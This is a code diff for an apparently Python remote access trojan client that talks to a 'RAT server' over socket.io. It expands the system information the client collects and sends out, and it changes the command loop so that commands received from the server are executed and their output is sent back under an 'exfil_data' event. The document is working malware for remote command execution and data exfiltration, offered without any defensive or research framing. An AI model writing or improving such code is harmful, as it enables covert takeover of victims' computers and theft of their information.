@@ -16,6 +16,9 @@ def get_system_info():
         "os": platform.system(),
         "os_version": platform.release(),
         "architecture": platform.machine(),
+        "processor": platform.processor(),
+        "platform": platform.platform(),
+        "uptime": None,
     }
     return info
 
@@ -51,7 +54,8 @@ def main():
             network_info = get_network_info()
             exfil_data = {
                 "system": system_info,
-                "network": network_info
+                "network": network_info,
+                "type": "system_info"
             }
             sio.emit('exfil_data', json.dumps(exfil_data))
             print("[*] Exfiltrated data sent to RAT server")
@@ -71,11 +75,15 @@ def main():
                 print("[*] Received exit command")
                 sio.disconnect()
                 return
-            # Execute the command and send back the result (if needed)
+            # Execute the command and send back the result
             output = execute_command(data)
             print(f"[*] Executed command: {data}")
-            # Optionally send the output back
-            sio.emit('exfil_data', json.dumps({"command_output": output}))
+            # Send the output back with a type indicator
+            sio.emit('exfil_data', json.dumps({
+                "type": "command_output",
+                "command": data,
+                "output": output
+            }))
 
         while True:
             try:
